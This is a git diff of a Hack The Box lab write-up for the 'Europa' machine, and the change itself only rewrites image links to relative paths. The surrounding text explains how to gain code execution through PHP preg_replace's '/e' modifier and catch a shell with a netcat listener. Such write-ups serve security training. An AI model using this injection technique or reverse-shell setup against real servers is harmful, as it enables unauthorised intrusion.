@@ -72,13 +72,13 @@ So our login is
 Pretty sure we need to exploit the **OpenVPN Config Generator** located at https://admin-portal.europacorp.htb/tools.php. So after filling in a IP address a config gets generated with our IP address filled in at the locations of **ip_address**. After googling a bit we found out that the php function **preg_replace** is exploitable.
 
 Okay intercepting the POST with BurpSuite and send it to the Repeater will leave us with a screen like this:
-![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/europa_burp.png "BurpSuite")
+![index.php](images/europa_burp.png "BurpSuite")
 
 
 Because we have full access to the regex expression that is used in preg_replace();
 We can pass the **e** modifier which will make the text being executed. I only want it to be executed once so I picked a pattern that only occurs once. As you can see I used **/remote_address/e** as the pattern and **phpinfo()** as the text. It executes perfectly as shown in the screenshot below.
 
-![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/burp_info.png "phpinfo")
+![index.php](images/burp_info.png "phpinfo")
 
 So lets put our payload in the ipaddress parameter which is as follows:
 
@@ -89,7 +89,7 @@ And send it while listening with netcat on port 12345
 ```
 nc -nvlp 12345
 ```
-![index.php](https://github.com/jakobgoerke/HTB-Writeups/blob/master/Europa/images/shell.png "shell")
+![index.php](images/shell.png "shell")
 
 Perfect we got shell! We can find the user flag at /home/john/user.txt
 
